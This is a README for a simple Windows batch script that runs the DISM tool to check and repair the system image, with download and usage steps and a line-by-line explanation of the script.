## 📥 How to Download the Repo (First-Time Users)

Click the link to read [**Instructions**](https://www.gitprojects.fnbubbles420.org/how-to-download-repos) 📄.

---

## ⚠️ No Issues with this Repo!

- If you want to **FORK** it, **GO FORK IT**! 🍴
- Make sure you have an account to **FORK** the repo 🔐.

---

### 🚨 **READ EVERYTHING CAREFULLY** 🚨

---

# 🖥️ Deploy Image Servicing & Management Batch Script

This is a simple batch script for Windows that uses the **Deployment Image Servicing and Management (DISM)** tool to check the health of your system image and repair it if necessary 🛠️.

---

### 📥 Download Instructions

- Click the **green button** in the upper right corner and download the ZIP file 📂.

---

### 🚀 Usage

1. **Open a command prompt** with **ADMINISTRATIVE PRIVILEGES** 🔒.
2. **Navigate** to the directory containing the `Deploy Image Servicing & Management.bat` file.
3. **Run the script** by typing:

   ```
   Deploy Image Servicing & Management.bat
   ```
and pressing Enter 💻.

### 💡 What the Script Does

Here's a breakdown of what each line in the script does:

```
@echo off                                       # Prevents the command prompt from displaying the commands in the script as they run
echo Running DISM command...                    # Starts the program and displays a message
DISM.exe /Online /Cleanup-image /Restorehealth   # Checks the health of your system image and repairs it if necessary
echo DISM command completed.                    # Displays a completion message
pause                                           # Keeps the window open so the user can close it manually
```

## 🚨 READ EVERYTHING CAREFULLY 🚨

**Make sure to follow the instructions step-by-step for a smooth execution of the script ✅.**
